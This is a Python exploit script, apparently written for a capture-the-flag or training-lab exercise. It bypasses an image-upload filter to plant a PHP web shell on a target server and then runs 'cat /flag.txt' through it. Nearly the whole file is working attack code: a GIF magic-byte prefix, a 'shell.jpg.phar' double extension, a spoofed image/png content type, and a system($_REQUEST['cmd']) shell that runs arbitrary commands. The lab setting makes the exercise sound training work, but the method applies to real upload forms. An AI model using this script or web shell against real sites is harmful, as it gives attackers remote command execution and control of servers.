""" 
---------------------------
Type Filters
---------------------------

1. The above server employs Client-Side, Blacklist, Whitelist, Content-Type, 
    and MIME-Type filters to ensure the uploaded file is an image. Try to combine 
    all of the attacks you learned so far to bypass these filters and upload a PHP file 
    and read the flag at "/flag.txt"

"""

# Import Request to send web request to the internet
import requests
import sys
import subprocess
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Optional headers to mimic your Burp capture
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://{target}",
    "Referer": "http://{target}/",
    # don't set Content-Type here — requests will set the correct multipart boundary
}
    
def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202
    
    # ============================ PHP SCRIPT ============================ #
    php_web_shell_filename = "shell.jpg.phar"
    php_content = "GIF8 <?php system($_REQUEST['cmd']); ?>"
    
    # ============================ UPLOAD AND ACCESS URL of TARGET ============================ #
    upload_url = f"http://{target}/upload.php"
    # Specify Profile Images
    access_url = f"http://{target}/profile_images/{php_web_shell_filename}?cmd=cat%20/flag.txt"
    
    # ============================ UPLOAD FILE TO TARGET, By passing blacklist filters ============================ #
    # Upload File 
    upload_response = upload_file(php_web_shell_filename, php_content, upload_url)
    
    # Display upload Response
    print_response(upload_response)

    # ============================ ACESS FLAG AND WEBSHELL RESPONSE of TARGET ============================ #
    web_shell_response = access_web_shell(access_url)

    # Display Flag / Web Shell Response
    print_response(web_shell_response)


def upload_file(php_web_shell_filename, php_content, upload_url):
    # FILE INFORMATION
    files = {
        # form field name matches the one in Burp capture
        "uploadFile": (php_web_shell_filename, php_content.encode("utf-8"), "image/png"),
    }
    # Add specific headers from Burp capture
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "DNT": "1",
        "Sec-GPC": "1",
        "Connection": "keep-alive"
    }
    # ============================ Initiate the Request to UPLOAD PHP FILE  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    print("\n ############### UPLOAD FILE RESPONSE ###############")
    # return response to upload 
    return r

def access_web_shell(access_url):
    # ============================ ACCESS Web Shell / PHP UPLOAD FILE RESPONSE ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(access_url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    print("\n ############### WEB SHELL RESPONSE WITH FLAG ###############")
    # return response to with flag
    return r
    

def print_response(response):
    r = response
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS,r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS,r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES,r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()